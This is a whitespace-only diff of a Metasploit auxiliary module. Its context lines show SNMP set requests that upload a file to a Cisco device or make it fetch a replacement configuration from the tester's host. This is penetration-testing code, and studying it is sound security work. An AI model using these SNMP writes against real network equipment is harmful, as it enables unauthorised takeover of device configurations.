@@ -113,8 +113,7 @@ class MetasploitModule < Msf::Auxiliary
       session = rand(255) + 1
 
       snmp = connect_snmp
-      
-      
+
       varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyEntryStatus']}#{session}" , SNMP::Integer.new(6))
       value = snmp.set(varbind)
 
@@ -123,11 +122,11 @@ class MetasploitModule < Msf::Auxiliary
 
       varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyCommand']}#{session}" , SNMP::Integer.new(2))
       value = snmp.set(varbind)
-      
+
 
       # If the above line didn't throw an error, the host is alive and the community is valid
       print_status("Copying file #{@filename} to #{ip}...")
-      
+
       if(action.name == 'Upload_File')
 
         varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyProtocol']}#{session}" , SNMP::Integer.new(1))
@@ -144,28 +143,28 @@ class MetasploitModule < Msf::Auxiliary
 
         varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyEntryStatus']}#{session}" , SNMP::Integer.new(1))
         value = snmp.set(varbind)
-        
+
       elsif(action.name == 'Override_Config')
-      
+
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyProtocol']}#{session}" , SNMP::Integer.new(1))
         value = snmp.set(varbind)
-        
+
         varbind = SNMP::VarBind.new("#{action.opts['ccCopySourceFileType']}#{session}" , SNMP::Integer.new(1))
         value = snmp.set(varbind)
-        
+
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyDestFileType']}#{session}" , SNMP::Integer.new(4))
         value = snmp.set(varbind)
-        
+
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyServerAddress']}#{session}", SNMP::IpAddress.new(lhost))
         value = snmp.set(varbind)
-        
+
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyFileName']}#{session}", SNMP::OctetString.new(@filename))
         value = snmp.set(varbind)
-        
+
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyEntryRowStatus']}#{session}" , SNMP::Integer.new(1))
         value = snmp.set(varbind)
       end
-        
+
 
     # No need to make noise about timeouts
     rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
